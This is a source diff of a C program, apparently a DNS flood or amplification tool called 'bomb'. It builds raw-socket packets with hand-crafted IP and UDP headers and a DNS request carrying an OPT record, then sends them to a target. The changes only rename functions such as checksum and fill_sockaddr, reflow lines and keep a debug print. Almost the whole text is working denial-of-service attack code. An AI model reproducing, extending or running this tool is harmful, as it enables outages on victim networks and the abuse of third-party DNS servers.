@@ -71,20 +71,20 @@ typedef struct {
 } bomb_t;
 
 /* Functions */
-bomb_t *create_rawsock(bomb_t *);
+bomb_t *Create_Rawsock(bomb_t *);
 bomb_t *stfu_kernel(bomb_t *);
-unsigned short checksum(unsigned short *, int);
+unsigned short Checksum(unsigned short *, int);
 bomb_t *build_ip_header(bomb_t *);
 bomb_t *build_udp_header(bomb_t *);
 bomb_t *build_dns_request(bomb_t *);
 void dns_name_format(char *, char *);
 bomb_t *build_packet(bomb_t *,  int);
-bomb_t *fill_sockaddr(bomb_t *);
+bomb_t *Fill_sock(bomb_t *);
 void Implement(int);
 
 
 /* create raw socket */
-bomb_t *create_rawsock(bomb_t *a)
+bomb_t *Create_Rawsock(bomb_t *a)
 {
     a->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
@@ -104,7 +104,7 @@ bomb_t *stfu_kernel(bomb_t *a)
 
 
 /* For IP and UDP header */
-unsigned short checksum(unsigned short *addr, int len)
+unsigned short Checksum(unsigned short *addr, int len)
 {
     u_int32_t csum  = 0;
     
@@ -138,11 +138,9 @@ bomb_t *build_ip_header(bomb_t *bomb)
     bomb->ip->tos = 0;
     bomb->ip->frag_off = 0;
     bomb->ip->protocol = IPPROTO_UDP;
-    bomb->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) +
-                              sizeof(DNS_header) + sizeof(DNS_query) + sizeof(DNS_opt)
-                             + strlen(DEFAULT_DOMAIN) + 1);
-    bomb->ip->check = checksum((unsigned short *) bomb->ip,
-                               sizeof(struct iphdr));
+    bomb->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_header) + 
+                              sizeof(DNS_query) + sizeof(DNS_opt) + strlen(DEFAULT_DOMAIN) + 1);
+    bomb->ip->check = Checksum((unsigned short *) bomb->ip, sizeof(struct iphdr));
 
     return bomb;
 }
@@ -232,31 +230,29 @@ bomb_t *build_dns_request(bomb_t *bomb)
     return bomb;
 }
 
-
-/* build packet */
-bomb_t *build_packet(bomb_t *bomb, int c)
+bomb_t *build_packet(bomb_t *a, int c)
 {   
     printf("check3\n");
-    bomb->packet = (char *) malloc(4096);
-    bomb->packet = memset(bomb->packet, 0x00, 4096);
+    a->packet = (char *) malloc(4096);
+    a->packet = memset(a->packet, 0x00, 4096);
 
-    bomb = build_ip_header(bomb);
-    bomb = build_udp_header(bomb);
-    bomb = build_dns_request(bomb);
+    a = build_ip_header(a);
+    a = build_udp_header(a);
+    a = build_dns_request(a);
 
-    return bomb;
+    return a;
 }
 
-bomb_t *fill_sockaddr(bomb_t *bomb)
+bomb_t *Fill_sock(bomb_t *a)
 {
-    bomb->target.sin_family = AF_INET;
-    bomb->target.sin_port = bomb->udp->dest;
-    bomb->target.sin_addr.s_addr = bomb->ip->daddr;
+    a->target.sin_family = AF_INET;
+    a->target.sin_port = a->udp->dest;
+    a->target.sin_addr.s_addr = a->ip->daddr;
 
-    return bomb;
+    return a;
 }
 
-void Implement(int c)
+void Implement(int a)
 {
     bomb_t *b = NULL;
 
@@ -264,10 +260,10 @@ void Implement(int c)
     b = (bomb_t *) malloc(sizeof(bomb_t));
     b = memset(b, 0x00, sizeof(bomb_t));
 
-    b = create_rawsock(b);
+    b = Create_Rawsock(b);
     b = stfu_kernel(b);
-    b = build_packet(b, c);
-    b = fill_sockaddr(b);
+    b = build_packet(b, a);
+    b = Fill_sock(b);
 
     sendto(b->sock, b->packet, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_header)
                              + sizeof(DNS_query) + sizeof(DNS_opt)+ strlen(DEFAULT_DOMAIN) + 1, 0, (struct sockaddr *) &b->target, sizeof(b->target));
